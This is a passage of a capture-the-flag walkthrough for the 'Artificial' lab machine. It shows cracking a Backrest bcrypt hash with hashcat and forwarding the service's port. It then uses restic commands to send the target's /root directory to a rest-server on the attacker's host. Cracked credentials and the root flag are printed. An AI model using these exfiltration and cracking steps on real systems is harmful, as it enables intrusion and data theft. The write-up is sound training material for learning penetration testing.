-bash: cd: .config: No such file or directory
gael@artificial:~/backrest$ ls -R
.:
gael@artificial:~/backrest$ cat oplog.sqlite
cat: oplog.sqlite: No such file or directory

```

copy the archive locally then rename the backup to plain .tar and extract again:

```shell
scp gael@artificial.htb:/var/backups/backrest_backup.tar.gz .
gael@artificial.htb's password: 
backrest_backup.tar.gz  
mv backrest_backup.tar.gz backrest_backup.tar
```

```shell
ls -R                     
.:
backrest  install.sh  jwt-secret  oplog.sqlite  oplog.sqlite.lock  oplog.sqlite-shm  oplog.sqlite-wal  processlogs  restic  tasklogs

./processlogs:
backrest.log

./tasklogs:
logs.sqlite  logs.sqlite-shm  logs.sqlite-wal
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest]
└─$ ls -la  
total 51092
drwxr-xr-x  5 husmal husmal     4096 Mar  5  2025 .
drwx------ 38 husmal husmal     4096 Sep 10 22:03 ..
-rwxr-xr-x  1 husmal husmal 25690264 Feb 16  2025 backrest
drwxr-xr-x  3 husmal husmal     4096 Mar  3  2025 .config
-rwxr-xr-x  1 husmal husmal     3025 Mar  3  2025 install.sh
-rw-------  1 husmal husmal       64 Mar  3  2025 jwt-secret
-rw-r--r--  1 husmal husmal    57344 Mar  5  2025 oplog.sqlite
-rw-------  1 husmal husmal        0 Mar  3  2025 oplog.sqlite.lock
-rw-r--r--  1 husmal husmal    32768 Mar  5  2025 oplog.sqlite-shm
-rw-r--r--  1 husmal husmal        0 Mar  5  2025 oplog.sqlite-wal
drwxr-xr-x  2 husmal husmal     4096 Mar  3  2025 processlogs
-rwxr-xr-x  1 husmal husmal 26501272 Mar  3  2025 restic
drwxr-xr-x  3 husmal husmal     4096 Mar  5  2025 tasklogs
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest]
└─$ cd .config 
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config]
└─$ ls    
backrest
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config]
└─$ ls -la    
total 12
drwxr-xr-x 3 husmal husmal 4096 Mar  3  2025 .
drwxr-xr-x 5 husmal husmal 4096 Mar  5  2025 ..
drwxr-xr-x 2 husmal husmal 4096 Mar  5  2025 backrest
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config]
└─$ cd backrest 
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config/backrest]
└─$ ls -la
total 12
drwxr-xr-x 2 husmal husmal 4096 Mar  5  2025 .
drwxr-xr-x 3 husmal husmal 4096 Mar  3  2025 ..
-rw------- 1 husmal husmal  280 Mar  5  2025 config.json
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config/backrest]
└─$ cat config.json  
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/backrest/.config/backrest]
└─$ 

```


from hashes.com the string came back to: `JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP:$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`

detect hash type:

```shell
hashcat '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO'
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-1255U, 10809/21682 MB (4096 MB allocatable), 12MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Wed Sep 10 22:06:38 2025
Stopped: Wed Sep 10 22:06:38 2025

```

and then run hashcat in mode 3200:

```shell
hashcat -m 3200 '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i7-1255U, 10809/21682 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Wed Sep 10 22:07:34 2025 (12 secs)
Time.Estimated...: Thu Sep 11 23:36:38 2025 (1 day, 1 hour)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      156 H/s (7.82ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1872/14344385 (0.01%)
Rejected.........: 0/1872 (0.00%)
Restore.Point....: 1872/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:328-336
Candidate.Engine.: Device Generator
Candidates.#1....: sexy69 -> jesusfreak
Hardware.Mon.#1..: Temp: 62c Util: 83%

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Wed Sep 10 22:07:34 2025 (39 secs)
Time.Estimated...: Wed Sep 10 22:08:13 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      139 H/s (8.62ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5472/14344385 (0.04%)
Rejected.........: 0/5472 (0.00%)
Restore.Point....: 5328/14344385 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: lightbulb -> ilovejack
Hardware.Mon.#1..: Temp: 61c Util: 82%

Started: Wed Sep 10 22:07:13 2025
Stopped: Wed Sep 10 22:08:14 2025

```

so now we have these creds: `backrest_root:!@#$%^`

Looks like backrest is running on port 9898:

```shell
─(husmal㉿Ubuntu)-[~/backrest]
└─$ cat install.sh 
#! /bin/bash

cd "$(dirname "$0")" # cd to the directory of this script

install_or_update_unix() {
  if systemctl is-active --quiet backrest; then
    sudo systemctl stop backrest
    echo "Paused backrest for update"
  fi
  install_unix
}

install_unix() {
  echo "Installing backrest to /usr/local/bin"
  sudo mkdir -p /usr/local/bin

  sudo cp $(ls -1 backrest | head -n 1) /usr/local/bin
}

create_systemd_service() {
  if [ ! -d /etc/systemd/system ]; then
    echo "Systemd not found. This script is only for systemd based systems."
    exit 1
  fi

  if [ -f /etc/systemd/system/backrest.service ]; then
    echo "Systemd unit already exists. Skipping creation."
    return 0
  fi

  echo "Creating systemd service at /etc/systemd/system/backrest.service"

  sudo tee /etc/systemd/system/backrest.service > /dev/null <<- EOM
[Unit]
Description=Backrest Service
After=network.target

[Service]
Type=simple
User=$(whoami)
Group=$(whoami)
ExecStart=/usr/local/bin/backrest
Environment="BACKREST_PORT=127.0.0.1:9898"
Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
Environment="BACKREST_DATA=/opt/backrest"
Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"

[Install]
WantedBy=multi-user.target
EOM

  echo "Reloading systemd daemon"
  sudo systemctl daemon-reload
}

create_launchd_plist() {
  echo "Creating launchd plist at /Library/LaunchAgents/com.backrest.plist"

  sudo tee /Library/LaunchAgents/com.backrest.plist > /dev/null <<- EOM
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.backrest</string>
    <key>ProgramArguments</key>
    <array>
    <string>/usr/local/bin/backrest</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
        <key>BACKREST_PORT</key>
        <string>127.0.0.1:9898</string>
    </dict>
</dict>
</plist>
EOM
}

enable_launchd_plist() {
  echo "Trying to unload any previous version of com.backrest.plist"
  launchctl unload /Library/LaunchAgents/com.backrest.plist || true
  echo "Loading com.backrest.plist"
  launchctl load -w /Library/LaunchAgents/com.backrest.plist
}

OS=$(uname -s)
if [ "$OS" = "Darwin" ]; then
  echo "Installing on Darwin"
  install_unix
  create_launchd_plist
  enable_launchd_plist
  sudo xattr -d com.apple.quarantine /usr/local/bin/backrest # remove quarantine flag
elif [ "$OS" = "Linux" ]; then
  echo "Installing on Linux"
  install_or_update_unix
  create_systemd_service
  echo "Enabling systemd service backrest.service"
  sudo systemctl enable backrest
  sudo systemctl start backrest
else
  echo "Unknown OS: $OS. This script only supports Darwin and Linux."
  exit 1
fi

echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
echo "Access backrest WebUI at http://localhost:9898"

```

so port forward port 9898:

```shell
ssh -L 9898:localhost:9898 gael@10.129.232.51
```

![artificial-4](/images/artificial/Pasted image 20250910221306.png)

I couldn't find a CVE for this so I will inspect manually

I think adding a sample repository and then using restic commands to exfiltrate the /root directory as per GTFOBins is a the way to go, and we have to install a local restic server to receive the data

```shell
curl -L https://github.com/restic/rest-server/releases/download/v0.12.1/rest-server_0.12.1_linux_amd64.tar.gz -o rest-server.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 3765k  100 3765k    0     0  1297k      0  0:00:02  0:00:02 --:--:-- 2818k
tar -xvf rest-server.tar.gz
rest-server_0.12.1_linux_amd64/CHANGELOG.md
rest-server_0.12.1_linux_amd64/LICENSE
rest-server_0.12.1_linux_amd64/README.md
rest-server_0.12.1_linux_amd64/rest-server
sudo mv rest-server_0.12.1_linux_amd64/rest-server /usr/local/bin/ 
sudo chmod +x /usr/local/bin/rest-server
rest-server --path /tmp/restic-data --listen :12345 --no-auth
Data directory: /tmp/restic-data
Authentication disabled
Private repositories disabled
start server on :12345

```

and now on the machine

![artificial-5](/images/artificial/Pasted image 20250911102859.png)

execute this command in run command:

```shell
init -r rest:http://10.10.16.45:12345/repo1
```

we get on kali:

```shell
Creating repository directories in /tmp/restic-data/repo1
```

then run this:

```shell
backup -r rest:http://10.10.16.46:12345/repo1 /root
```

On our machine: I tried the backup with root.txt first because I thought it was just for files

```shell
restic snapshots -r /tmp/restic-data/repo1                             
enter password for repository: 
repository b0e2a87e opened (version 2, compression level auto)
ID        Time                 Host        Tags        Paths           Size
--------------------------------------------------------------------------------
2e2d429c  2025-09-11 10:34:01  artificial              /root/root.txt  33 B
f1a75837  2025-09-11 10:35:45  artificial              /root           4.299 MiB
--------------------------------------------------------------------------------
2 snapshots

```

```shell
restic ls f1a75837 -r /tmp/restic-data/repo1 | grep root.txt
enter password for repository: 
/root/root.txt

```

Now extract the data :

```shell
 restic restore -r "/tmp/restic-data/repo1" f1a75837 --target .
enter password for repository: 
repository b0e2a87e opened (version 2, compression level auto)
[0:00] 100.00%  2 / 2 index files loaded
restoring snapshot f1a75837 of [/root] at 2025-09-11 07:35:45.408633429 +0000 UTC by root@artificial to .
Summary: Restored 79 files/dirs (4.299 MiB) in 0:00, skipped 1 files/dirs 33 B
ls | grep root
root
ls            
root.txt  scripts
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/root]
└─$ cat root.txt                                                           
42f7654254d88156dff513d458854271
                                                                                                                                                                                                                                            
┌──(husmal㉿Ubuntu)-[~/root]

```




## Resources
- https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass#insecure-serializationby-design
- https://mastersplinter.work/research/tensorflow-rce/
- https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
- https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/
- https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html
- https://gtfobins.github.io/gtfobins/restic/
